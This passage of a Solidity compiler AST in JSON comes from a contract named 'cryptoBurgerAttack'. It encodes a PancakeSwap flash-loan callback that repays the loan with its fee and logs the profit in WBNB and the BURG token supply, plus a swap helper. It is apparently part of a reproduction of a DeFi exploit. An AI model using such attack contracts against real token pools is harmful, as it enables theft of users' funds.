                          "lValueRequested": false,
                          "leftExpression": {
                            "components": [
                              {
                                "commonType": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                },
                                "id": 1353,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "leftExpression": {
                                  "id": 1351,
                                  "name": "amount",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 210,
                                  "src": "11722:6:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "nodeType": "BinaryOperation",
                                "operator": "*",
                                "rightExpression": {
                                  "hexValue": "33",
                                  "id": 1352,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "11731:1:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_3_by_1",
                                    "typeString": "int_const 3"
                                  },
                                  "value": "3"
                                },
                                "src": "11722:10:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              }
                            ],
                            "id": 1354,
                            "isConstant": false,
                            "isInlineArray": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "nodeType": "TupleExpression",
                            "src": "11721:12:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "/",
                          "rightExpression": {
                            "hexValue": "393937",
                            "id": 1355,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "11736:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_997_by_1",
                              "typeString": "int_const 997"
                            },
                            "value": "997"
                          },
                          "src": "11721:18:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "id": 1357,
                      "isConstant": false,
                      "isInlineArray": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "nodeType": "TupleExpression",
                      "src": "11720:20:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "+",
                    "rightExpression": {
                      "hexValue": "31",
                      "id": 1358,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "11743:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1_by_1",
                        "typeString": "int_const 1"
                      },
                      "value": "1"
                    },
                    "src": "11720:24:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "11706:38:0"
                },
                {
                  "assignments": [
                    1362
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 1362,
                      "mutability": "mutable",
                      "name": "amountToRepay",
                      "nameLocation": "11762:13:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "11754:21:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 1361,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "11754:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 1366,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 1365,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 1363,
                      "name": "amount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 210,
                      "src": "11778:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "+",
                    "rightExpression": {
                      "id": 1364,
                      "name": "fee",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1350,
                      "src": "11787:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "11778:12:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "11754:36:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1371,
                        "name": "pair",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 180,
                        "src": "11830:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1372,
                        "name": "amountToRepay",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1362,
                        "src": "11836:13:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 1368,
                            "name": "tokenBorrow",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 208,
                            "src": "11808:11:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1367,
                          "name": "IERC20",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1557,
                          "src": "11801:6:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IERC20_$1557_$",
                            "typeString": "type(contract IERC20)"
                          }
                        },
                        "id": 1369,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11801:19:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$1557",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 1370,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1517,
                      "src": "11801:28:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 1373,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11801:49:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 1374,
                  "nodeType": "ExpressionStatement",
                  "src": "11801:49:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "526570617920616d6f756e74",
                        "id": 1376,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11869:14:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_f86d56fb0fdf22345d9c51838c26a321ce6d21c0981f0fd73cae45a931191c90",
                          "typeString": "literal_string \"Repay amount\""
                        },
                        "value": "Repay amount"
                      },
                      {
                        "id": 1377,
                        "name": "amountToRepay",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1362,
                        "src": "11885:13:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_f86d56fb0fdf22345d9c51838c26a321ce6d21c0981f0fd73cae45a931191c90",
                          "typeString": "literal_string \"Repay amount\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 1375,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "11865:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 1378,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11865:34:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1379,
                  "nodeType": "EmitStatement",
                  "src": "11860:39:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "50726f6669742061667465722072657061793a20",
                        "id": 1381,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "11932:22:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_a57293e3b40cb1f6696d2766a4bc8e6cfe8c9c646e582b00f7800652b1bc1b10",
                          "typeString": "literal_string \"Profit after repay: \""
                        },
                        "value": "Profit after repay: "
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1386,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "12001:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1385,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "11993:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1384,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "11993:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1387,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "11993:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1382,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "11968:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1383,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "11968:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1388,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "11968:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_a57293e3b40cb1f6696d2766a4bc8e6cfe8c9c646e582b00f7800652b1bc1b10",
                          "typeString": "literal_string \"Profit after repay: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 1380,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "11915:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 1389,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "11915:102:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1390,
                  "nodeType": "EmitStatement",
                  "src": "11910:107:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "546f74616c204255524720737570706c7920",
                        "id": 1392,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "12036:20:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_906ff4718e3fd7e17d3446ea4f0b525a9585e0e2ce9e8115fb8638f024111992",
                          "typeString": "literal_string \"Total BURG supply \""
                        },
                        "value": "Total BURG supply "
                      },
                      {
                        "arguments": [],
                        "expression": {
                          "argumentTypes": [],
                          "expression": {
                            "id": 1393,
                            "name": "BURGER_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 58,
                            "src": "12058:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1394,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "totalSupply",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1499,
                          "src": "12058:28:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$__$returns$_t_uint256_$",
                            "typeString": "function () view external returns (uint256)"
                          }
                        },
                        "id": 1395,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "12058:30:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_906ff4718e3fd7e17d3446ea4f0b525a9585e0e2ce9e8115fb8638f024111992",
                          "typeString": "literal_string \"Total BURG supply \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 1391,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "12032:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 1396,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "12032:57:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1397,
                  "nodeType": "EmitStatement",
                  "src": "12027:62:0"
                }
              ]
            },
            "functionSelector": "84800812",
            "id": 1399,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "pancakeCall",
            "nameLocation": "1936:11:0",
            "nodeType": "FunctionDefinition",
            "overrides": {
              "id": 159,
              "nodeType": "OverrideSpecifier",
              "overrides": [],
              "src": "2070:8:0"
            },
            "parameters": {
              "id": 158,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 151,
                  "mutability": "mutable",
                  "name": "_sender",
                  "nameLocation": "1965:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1399,
                  "src": "1957:15:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 150,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1957:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 153,
                  "mutability": "mutable",
                  "name": "_amount0",
                  "nameLocation": "1990:8:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1399,
                  "src": "1982:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 152,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "1982:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 155,
                  "mutability": "mutable",
                  "name": "_amount1",
                  "nameLocation": "2016:8:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1399,
                  "src": "2008:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 154,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "2008:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 157,
                  "mutability": "mutable",
                  "name": "_data",
                  "nameLocation": "2049:5:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1399,
                  "src": "2034:20:0",
                  "stateVariable": false,
                  "storageLocation": "calldata",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes_calldata_ptr",
                    "typeString": "bytes"
                  },
                  "typeName": {
                    "id": 156,
                    "name": "bytes",
                    "nodeType": "ElementaryTypeName",
                    "src": "2034:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_storage_ptr",
                      "typeString": "bytes"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1947:113:0"
            },
            "returnParameters": {
              "id": 160,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2079:0:0"
            },
            "scope": 1472,
            "src": "1927:10169:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 1466,
              "nodeType": "Block",
              "src": "12303:516:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1416,
                        "name": "PANCAKE_SWAP_PAIR",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 37,
                        "src": "12338:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1417,
                        "name": "amountIn",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1405,
                        "src": "12357:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 1413,
                            "name": "_tokenIn",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1401,
                            "src": "12320:8:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1412,
                          "name": "IERC20",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1557,
                          "src": "12313:6:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IERC20_$1557_$",
                            "typeString": "type(contract IERC20)"
                          }
                        },
                        "id": 1414,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "12313:16:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$1557",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 1415,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "approve",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1537,
                      "src": "12313:24:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 1418,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "12313:53:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 1419,
                  "nodeType": "ExpressionStatement",
                  "src": "12313:53:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1424,
                        "name": "PANCAKE_SWAP_ROUTER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 31,
                        "src": "12401:19:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1425,
                        "name": "amountIn",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1405,
                        "src": "12422:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 1421,
                            "name": "_tokenIn",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1401,
                            "src": "12383:8:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1420,
                          "name": "IERC20",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1557,
                          "src": "12376:6:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IERC20_$1557_$",
                            "typeString": "type(contract IERC20)"
                          }
                        },
                        "id": 1422,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "12376:16:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$1557",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 1423,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "approve",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1537,
                      "src": "12376:24:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 1426,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "12376:55:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 1427,
                  "nodeType": "ExpressionStatement",
                  "src": "12376:55:0"
                },
                {
                  "assignments": [
                    1432
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 1432,
                      "mutability": "mutable",
                      "name": "path",
                      "nameLocation": "12459:4:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1466,
                      "src": "12442:21:0",
                      "stateVariable": false,
                      "storageLocation": "memory",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                        "typeString": "address[]"
                      },
                      "typeName": {
                        "baseType": {
                          "id": 1430,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "12442:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 1431,
                        "nodeType": "ArrayTypeName",
                        "src": "12442:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_address_$dyn_storage_ptr",
                          "typeString": "address[]"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 1433,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "12442:21:0"
                },
                {
                  "expression": {
                    "id": 1440,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 1434,
                      "name": "path",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1432,
                      "src": "12473:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                        "typeString": "address[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "hexValue": "32",
                          "id": 1438,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "12494:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_2_by_1",
                            "typeString": "int_const 2"
                          },
                          "value": "2"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_2_by_1",
                            "typeString": "int_const 2"
                          }
                        ],
                        "id": 1437,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "NewExpression",
                        "src": "12480:13:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_array$_t_address_$dyn_memory_ptr_$",
                          "typeString": "function (uint256) pure returns (address[] memory)"
                        },
                        "typeName": {
                          "baseType": {
                            "id": 1435,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "12484:7:0",
                            "stateMutability": "nonpayable",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "id": 1436,
                          "nodeType": "ArrayTypeName",
                          "src": "12484:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_storage_ptr",
                            "typeString": "address[]"
                          }
                        }
                      },
                      "id": 1439,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "12480:16:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                        "typeString": "address[] memory"
                      }
                    },
                    "src": "12473:23:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                      "typeString": "address[] memory"
                    }
                  },
                  "id": 1441,
                  "nodeType": "ExpressionStatement",
                  "src": "12473:23:0"
                },
                {
                  "expression": {
                    "id": 1446,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "baseExpression": {
                        "id": 1442,
                        "name": "path",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1432,
                        "src": "12507:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                          "typeString": "address[] memory"
                        }
                      },
                      "id": 1444,
                      "indexExpression": {
                        "hexValue": "30",
                        "id": 1443,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "12512:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
